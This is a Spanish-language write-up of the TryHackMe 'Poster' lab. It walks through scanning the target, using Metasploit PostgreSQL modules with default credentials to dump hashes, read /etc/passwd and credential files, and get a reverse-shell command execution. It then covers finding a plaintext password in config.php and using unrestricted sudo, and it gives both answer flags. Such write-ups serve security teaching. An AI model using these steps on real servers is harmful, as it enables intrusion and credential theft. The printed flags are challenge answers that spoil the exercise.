# Writeup Poster - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.128.128.45 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---


## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, es un escaneo inicial de puertos, para saber que tenemos entre nuestras manos:


```bash
sudo nmap -sC -sV -Pn -sS -p- 10.128.128.45 -oN scan_poster.txt
```
```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu
80/tcp   open  http       Apache httpd 2.4.18
5432/tcp open  postgresql PostgreSQL DB 9.5
```
Podemos ver que hay abierto tres puertos en la máquina: SSH, HTTP y un servidor de bases de datos PostgreSQL.

---

## Enumeración

Ahora, para empezar a recopilar información del servidor, usaremos Metasploit para enumerar los usuarios que tiene la base de datos y ahí lanzar un ataque con Hydra para poder acceder a la máquina.

![Metasploit](/imgPoster/image.png)

```bash
msf auxiliary(scanner/postgres/postgres_login) > set rhosts 10.128.128.45
rhosts => 10.128.128.45
msf auxiliary(scanner/postgres/postgres_login) > run
```
¡Hemos encontrado el usuario y la contraseña de la base de datos! Es postgres:password (madre de dios...), ahora vamos a entrar a la base de datos para ver que hay en ella usando el módulo de postgres_sql de Metasploit.


```bash
use auxiliary/admin/postgres/postgres_sql
set RHOSTS 10.128.128.45
set USERNAME postgres
set PASSWORD password
run
```
![Metasploit](/imgPoster/image2.png)

Podemos ver que la versión de PostgreSQL es la 9.5.21, por lo que lo anotaremos por si lo necesitamos más adelante. Ahora vamos a buscar los usuarios de la base de datos.

Ahora, para buscar los usuarios, realizaremos un hashdump de la base de datos.

```bash
msf auxiliary(scanner/postgres/postgres_hashdump) > setg rhosts 10.128.128.45
rhosts => 10.128.128.45
msf auxiliary(scanner/postgres/postgres_hashdump) > set password password
password => password
msf auxiliary(scanner/postgres/postgres_hashdump) > run
```

![Metasploit](/imgPoster/image3.png)


¡Tenemos los hash de las contraseñas de todos los usuarios de la base de datos! Pero antes de nada, vamos a ver a que archivos tenemos acceso con los usuarios, usando el módulo de readfile de postgres.

```bash
msf auxiliary(admin/postgres/postgres_readfile) > set password password
password => password
msf auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.128.128.45
```

![Metasploit](/imgPoster/image4.png)


![Metasploit](/imgPoster/image5.png)

¡Ojito, ojito! Hemos conseguido ver el contenido de /etc/passwd, por lo que sabemos que usuarios hay en la máquina, para poder realizar por fin un ataque por fuerza bruta con Hydra para entrar en la máquina por SSH. Pero antes, podemos usar un módulo (otra vez en Metasploit) para poder ejecutar comandos de forma remota y acceder a la máquina por fin.

---

## Explotación

Ahora, usaremos el módulo `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` para poder ejecutar comandos de forma remota y acceder a la máquina por fin.



```bash
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password password
password => password
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > setg lhost 192.168.130.81
lhost => 192.168.130.81
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run
```

![Metasploit](/imgPoster/image6.png)

¡Tenemos acceso como usuario! Como la shell que nos han proporcionado no es interactiva, tendremos que usar el comando "find" para obtener acceso a la flag de usuario.
¿Recordáis la carpeta /home/dark/ que vimos en /etc/passwd? Pues ahí usaremos el módulo de postgres_readfile con la ruta de las contraseñas para sacar la contraseña de dark.

```bash
msf auxiliary(admin/postgres/postgres_readfile) > set rfile /home/dark/credentials.txt
rfile => /home/dark/credentials.txt
msf auxiliary(admin/postgres/postgres_readfile) > run
```

![Metasploit](/imgPoster/image7.png)

Ahora, que tenemos la contraseña del usuario dark, podemos por fin iniciar sesión en la máquina por SSH.

```bash
ssh dark@10.128.128.45                                                      
The authenticity of host '10.128.128.45 (10.128.128.45)' can't be established.
```
Al entrar, tenemos el primer problema, no podemos acceder al contenido de la flag de user.txt, por lo que tendremos que buscar la contraseña del usuario alison para leer el contenido.
Ya que hay un servidor web, vamos a revisar la carpeta /var/www/html y buscar un archivo .php de configuración para saber si hay una contraseña de alison.

```bash
cd /var/www/html
$ ls -lha
total 16K
drwxr-xr-x 3 root   root   4.0K Jul 28  2020 .
drwxr-xr-x 3 root   root   4.0K Jul 28  2020 ..
-rwxrwxrwx 1 alison alison  123 Jul 28  2020 config.php
drwxr-xr-x 4 alison alison 4.0K Jul 28  2020 poster
$ cat config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";

```
¡Tenemos la contraseña de alison! Ahora podremos entrar por SSH y obtener la flag de usuario.

```bash
alison@ubuntu:~$ ls
user.txt
alison@ubuntu:~$ cat user.txt
THM{postgresql_fa1l_conf1gurat1on}
```
---

## Escalada de Privilegios

Ahora, para subir de privilegios en la cuenta, usaremos el comando sudo -l para saber que podemos hacer para bypassear el login.

```bash
lison@ubuntu:~$ sudo -l
[sudo] password for alison: 
Sorry, try again.
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```
Oh... Pues ya está, tenemos permiso para usar cualquier comando como sudo.

```bash
alison@ubuntu:~$ sudo cat /root/root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```
---

## Flags

- **User Flag**: THM{postgresql_fa1l_conf1gurat1on}
- **Root Flag**: THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
